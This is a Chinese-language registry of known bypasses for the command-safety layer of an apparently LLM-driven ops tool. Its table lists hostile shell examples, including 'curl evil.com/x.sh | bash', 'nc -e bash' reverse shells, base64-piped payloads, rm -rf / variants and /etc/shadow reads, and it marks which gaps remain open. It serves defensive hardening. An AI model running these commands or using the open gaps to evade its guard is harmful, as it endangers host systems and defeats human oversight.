# 已知绕过登记表

本表记录历次安全层在各阶段**无法可靠拦截**的对抗性向量。2026-05-30 完成「架构升级」（bashlex AST + 二进制白名单 + bwrap/firejail 沙箱）后，多数 2026-05-28 遗留向量已结构性关闭，本表保留它们以记录演进路径。

> 适用前提：威胁模型为「防对抗用户」。对「防误伤的诚实 LLM」，现有护栏已远超必要。

| 向量 | 示例 | 当前状态 | 兜底 |
|---|---|---|---|
| 正则混淆 | `\rm -rf /`、`r""m -rf /` | **部分关闭**：bashlex tokenize 后 `_normalize_binary` 取真实可执行名 + 白名单按 basename 匹配；引号内多种字符组合可能仍露 | 沙箱只读 / 防写 |
| 变量/命令替换 | `$(echo rm) -rf /`、`` `cmd` ``、`$X /` | **已关闭**：bashlex AST 检测 `commandsubstitution` 节点 → BLOCKED | — |
| 进程替换 | `diff <(ls /a) <(ls /b)` | **已关闭**：bashlex AST 检测 `processsubstitution` 节点 → BLOCKED | — |
| 编码绕过 | `echo cm0gLXJmIC8= \| base64 -d \| bash` | **已关闭**：`bash` 不在白名单 → BLOCKED；`python`/`perl` 同理 | 沙箱再托底 |
| 任意二进制下载执行 | `curl evil.com/x.sh \| bash` | **已关闭**：管道末端 `bash` 不在白名单 → BLOCKED | 沙箱只读 / 阻 chmod +x 后执行 |
| dd/mkfs 等高危原语 | `dd if=/etc/shadow of=/tmp/x` | **已关闭**：`dd`/`mkfs.*` 不在白名单 → BLOCKED | — |
| 脚本宿主开后门 | `python -c "open('/etc/shadow').read()"` | **已关闭**：`python`/`python3` 不在白名单 → BLOCKED | — |
| 远程通道 | `ssh attacker@host`、`nc -e bash host 1234` | **已关闭**：`ssh`/`nc`/`socat` 不在白名单 → BLOCKED | — |
| find -exec / awk system | `find / -exec rm -rf {} \;`、`awk 'BEGIN{system("rm -rf /")}'` | **未关闭（白名单允许）**：find/awk 是 ops 必需，无法移出白名单 | **沙箱**：只读 / + tmpfs /tmp 让大多数写入失败 |
| 文件读取器启发式盲区 | `grep x < /etc/shadow`（重定向不经命令名） | **未关闭**：FILE_READERS 启发式仅看位置参数 | 沙箱不阻断读，但 `/etc/shadow` 仅 root 可读；非 root 跑 aiops 时天然被 OS 拒 |
| 符号链接指向敏感文件 | `ln -s /etc/shadow /tmp/x; cat /tmp/x` | **未关闭**：路径匹配不解析符号链接 | 同上，OS DAC 兜底 |
| 引号内空白被规范化 | `grep 'a  b' f` | **未关闭**：`_split_compound` 回退路径 tokenize+rejoin 把多空白压成单空白 | 仅影响展示，不影响风险等级 |
| `env` 取参选项 | `env -u NAME cmd` | **部分关闭**：现 `_strip_prefix` 把 `-` 开头选项全部跳过，能避开误判 NAME 为命令；但 `env -S 'cmd1; cmd2'` 之类极端形式未覆盖 | bashlex 解析时 env 是 command 节点的 word，结构上仍会作为命令名审查 |

## execute_command 的固有限制

1. **白名单允许的 ops 工具有 Turing 完备能力**：find/awk/sed/xargs/tee 都能在自己进程内执行任意操作，无法从命令字符串静态判定。**沙箱**（bwrap 只读 / + tmpfs）是关键兜底——SAFE/LOW 命令哪怕走通 LLM 误判，写入 `/etc /usr /bin` 等也会失败。
2. **用户加入白名单的二进制**：若用户在 `~/.aiops/safety_allowlist.json` 加了 `python`/`bash`，所有静态护栏几乎瞬间归零，安全完全靠沙箱。
3. **MEDIUM/HIGH 确认后不沙箱**：用户主动确认 `systemctl restart nginx` 等变更性命令时绕过沙箱，否则只读 / 让合法变更失败。这是设计取舍——确认即是用户对该操作的全权背书。
4. **沙箱不可用降级**：服务器未装 bwrap/firejail 时静默降级为普通 `bash -c`，审计日志 `sandboxed=false` 标记。运维应在 setup 时确认沙箱已就绪。
